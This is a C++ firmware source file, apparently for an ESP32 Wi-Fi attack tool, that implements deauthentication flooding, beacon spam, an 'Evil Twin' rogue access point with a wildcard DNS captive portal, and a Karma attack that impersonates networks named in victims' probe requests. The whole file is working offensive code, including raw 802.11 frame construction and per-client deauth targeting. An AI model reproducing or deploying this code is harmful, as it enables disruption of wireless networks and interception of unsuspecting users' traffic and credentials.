#include "attacks.h"
#include "wifi_engine.h"
#include "terminal.h"
#include "storage.h"
#include "config.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>

/* ================= DEAUTHER ================= */
static struct {
  bool     active;
  uint8_t  mode;       // 0 = broadcast to AP, 1 = single STA, 2 = all APs, 3 = beacon abuse
  uint8_t  type;       // reason code preset
  uint16_t burst;
  uint32_t period;
  uint32_t last;
  uint32_t sent;
} s_de;

static const uint8_t REASONS[5] = { 0x02, 0x03, 0x04, 0x05, 0x07 };

bool deauthStart(uint8_t mode, uint8_t type, uint16_t burst, uint32_t periodMs) {
  if (mode == 1 && !targetGet()->set) {
    termLog(LVL_ERR, "Deauth: no target selected.");
    return false;
  }
  s_de.active = true; s_de.mode = mode; s_de.type = type;
  s_de.burst = burst ? burst : DEAUTH_BURST;
  s_de.period = periodMs ? periodMs : 100;
  s_de.last = 0; s_de.sent = 0;
  termLog(LVL_OK, "Deauthentication started (mode=%u type=%u)", mode, type);
  return true;
}

void deauthStop() {
  if (!s_de.active) return;
  s_de.active = false;
  termLog(LVL_WARN, "Deauthentication stopped. Frames sent: %lu", (unsigned long)s_de.sent);
}

bool deauthActive() { return s_de.active; }
uint32_t deauthSent() { return s_de.sent; }

static void deauthFire() {
  static const uint8_t BC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t reason = REASONS[s_de.type % 5];

  if (s_de.mode == 0 || s_de.mode == 3) {          // whole BSS
    TargetInfo* t = targetGet();
    if (!t->set) return;
    snifferSetChannel(t->ch);
    for (uint8_t i = 0; i < s_de.burst; i++) {
      sendDeauth(t->bssid, BC, reason);
      delayMicroseconds(300);
    }
    s_de.sent += s_de.burst;
  } else if (s_de.mode == 1) {                     // single STA
    TargetInfo* t = targetGet();
    if (!t->set) return;
    snifferSetChannel(t->ch);
    uint16_t n = clientCount();
    for (uint16_t i = 0; i < n; i++) {
      ClientInfo c;
      if (!clientGet(i, &c)) continue;
      if (memcmp(c.bssid, t->bssid, 6)) continue;
      for (uint8_t k = 0; k < s_de.burst; k++) {
        sendDeauth(t->bssid, c.mac, reason);
        delayMicroseconds(300);
      }
      s_de.sent += s_de.burst;
    }
  } else if (s_de.mode == 2) {                     // all seen APs
    uint16_t n = apCount();
    for (uint16_t i = 0; i < n; i++) {
      APInfo a;
      if (!apGet(i, &a)) continue;
      for (uint8_t k = 0; k < s_de.burst; k++) sendDeauth(a.bssid, BC, reason);
      s_de.sent += s_de.burst;
    }
  }
}

/* ================= BEACON SPAM ================= */
static struct {
  bool     active;
  char     prefix[20];
  uint8_t  count;
  uint32_t last;
  uint8_t  idx;
} s_bs;

static uint8_t s_spamMacs[16][6];

static uint16_t buildBeacon(uint8_t* b, const uint8_t* mac, const char* ssid, uint8_t ch) {
  uint16_t i = 0;
  b[i++] = 0x80; b[i++] = 0x00;
  b[i++] = 0x00; b[i++] = 0x00;
  memset(b + i, 0xFF, 6); i += 6;
  memcpy(b + i, mac, 6);  i += 6;
  memcpy(b + i, mac, 6);  i += 6;
  b[i++] = 0x00; b[i++] = 0x00;
  memset(b + i, 0, 8); i += 8;                 // timestamp
  b[i++] = 0x64; b[i++] = 0x00;                // interval 100
  b[i++] = 0x31; b[i++] = 0x04;                // ESS + Privacy
  uint8_t sl = strlen(ssid); if (sl > 32) sl = 32;
  b[i++] = 0x00; b[i++] = sl; memcpy(b + i, ssid, sl); i += sl;
  b[i++] = 0x01; b[i++] = 0x08;
  b[i++] = 0x82; b[i++] = 0x84; b[i++] = 0x8B; b[i++] = 0x96;
  b[i++] = 0x24; b[i++] = 0x30; b[i++] = 0x48; b[i++] = 0x6C;
  b[i++] = 0x03; b[i++] = 0x01; b[i++] = ch;
  return i;
}

bool beaconStart(const char* prefix, uint8_t count) {
  if (count < 1) count = 1;
  if (count > 16) count = 16;
  s_bs.active = true;
  s_bs.count = count;
  s_bs.idx = 0;
  strlcpy(s_bs.prefix, (prefix && *prefix) ? prefix : "FREE_WIFI", sizeof(s_bs.prefix));
  for (uint8_t i = 0; i < count; i++) {
    s_spamMacs[i][0] = 0x02;
    s_spamMacs[i][1] = random(0, 255);
    s_spamMacs[i][2] = random(0, 255);
    s_spamMacs[i][3] = random(0, 255);
    s_spamMacs[i][4] = random(0, 255);
    s_spamMacs[i][5] = i;
  }
  termLog(LVL_OK, "Beacon spam started: %u SSIDs", count);
  return true;
}

void beaconStop() { if (s_bs.active) { s_bs.active = false; termLog(LVL_WARN, "Beacon spam stopped."); } }
bool beaconActive() { return s_bs.active; }

/* ================= EVIL TWIN ================= */
static struct {
  bool       active;
  char       ssid[33];
  char       pass[64];
  uint8_t    ch;
  DNSServer* dns;
} s_et;

bool evilStart(const char* ssid, const char* pass, uint8_t ch) {
  if (s_et.active) return false;
  strlcpy(s_et.ssid, ssid ? ssid : "", sizeof(s_et.ssid));
  strlcpy(s_et.pass, (pass && strlen(pass) >= 8) ? pass : "", sizeof(s_et.pass));
  s_et.ch = ch ? ch : 1;

  WiFi.softAPdisconnect(true);
  delay(60);
  bool ok;
  if (strlen(s_et.pass)) ok = WiFi.softAP(s_et.ssid, s_et.pass, s_et.ch, false, 8);
  else                   ok = WiFi.softAP(s_et.ssid, nullptr, s_et.ch, false, 8);
  if (!ok) { termLog(LVL_ERR, "Evil Twin: softAP failed."); return false; }

  s_et.dns = new DNSServer();
  s_et.dns->start(53, "*", WiFi.softAPIP());

  /* enable NAPT so clients get internet through uplink */
#if defined(ESP_IDF_VERSION_MAJOR) && ESP_IDF_VERSION_MAJOR >= 4
  esp_netif_t* ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (ap) esp_netif_napt_enable(ap);
#endif

  s_et.active = true;
  termLog(LVL_OK, "EVIL TWIN up: \"%s\" ch=%u  portal http://%s",
          s_et.ssid, s_et.ch, WiFi.softAPIP().toString().c_str());
  return true;
}

void evilStop() {
  if (!s_et.active) return;
  if (s_et.dns) { s_et.dns->stop(); delete s_et.dns; s_et.dns = nullptr; }
  WiFi.softAPdisconnect(true);
  delay(50);
  WiFi.softAP(MGMT_SSID, MGMT_PASS, MGMT_CHANNEL, MGMT_HIDDEN);
  s_et.active = false;
  termLog(LVL_WARN, "Evil Twin terminated.");
}

bool evilActive() { return s_et.active; }
const char* evilSSID() { return s_et.ssid; }

/* ================= KARMA ================= */
static struct {
  bool     active;
  uint32_t lastRotate;
  uint16_t lastCount;
  uint16_t clients;
} s_ka;

bool karmaStart() {
  if (s_ka.active) return false;
  s_ka.active = true;
  s_ka.lastRotate = 0;
  s_ka.lastCount = 0;
  probeClear();
  snifferStart(1, true, 0x00, 0x04, -95);      // hop + PROBE-REQ only
  termLog(LVL_OK, "Starting Karma Scan...");
  return true;
}

void karmaStop() {
  if (!s_ka.active) return;
  s_ka.active = false;
  snifferStop();
  termLog(LVL_WARN, "Karma scan stopped.");
}

bool karmaActive() { return s_ka.active; }
uint16_t karmaClients() { return s_ka.clients; }

bool karmaAttack(uint16_t probeIndex) {
  ProbeInfo p;
  if (!probeGet(probeIndex, &p)) return false;
  if (!p.ssid[0]) return false;

  WiFi.softAPdisconnect(true);
  delay(50);
  WiFi.softAP(p.ssid, nullptr, p.ch ? p.ch : 1, false, 4);

  if (!s_et.dns) {
    s_et.dns = new DNSServer();
    s_et.dns->start(53, "*", WiFi.softAPIP());
  }
  strlcpy(s_et.ssid, p.ssid, sizeof(s_et.ssid));
  s_et.active = true;

  char m[18];
  sprintf(m, "%02X:%02X:%02X:%02X:%02X:%02X", p.mac[0],p.mac[1],p.mac[2],p.mac[3],p.mac[4],p.mac[5]);
  termLog(LVL_OK, "KARMA attack on \"%s\" (victim %s, ch%u)", p.ssid, m, p.ch);
  return true;
}

/* ================= TICK ================= */
void attacksInit() {
  memset(&s_de, 0, sizeof(s_de));
  memset(&s_bs, 0, sizeof(s_bs));
  memset(&s_et, 0, sizeof(s_et));
  memset(&s_ka, 0, sizeof(s_ka));
}

void attacksTick() {
  uint32_t now = millis();

  if (s_de.active && now - s_de.last >= s_de.period) {
    s_de.last = now;
    deauthFire();
  }

  if (s_bs.active && now - s_bs.last >= BEACON_GAP_MS) {
    s_bs.last = now;
    uint8_t buf[128];
    uint8_t ch = curChannel();
    uint16_t n = buildBeacon(buf, s_spamMacs[s_bs.idx % s_bs.count], s_bs.prefix, ch);
    rawTx(buf, n);
    s_bs.idx++;
  }

  if (s_et.active && s_et.dns) s_et.dns->processNextRequest();

  if (s_ka.active) {
    uint16_t pc = probeCount();
    if (pc > s_ka.lastCount) s_ka.lastCount = pc;
    if (now - s_ka.lastRotate > KARMA_ROTATE_MS && pc) {
      s_ka.lastRotate = now;
    }
  }
}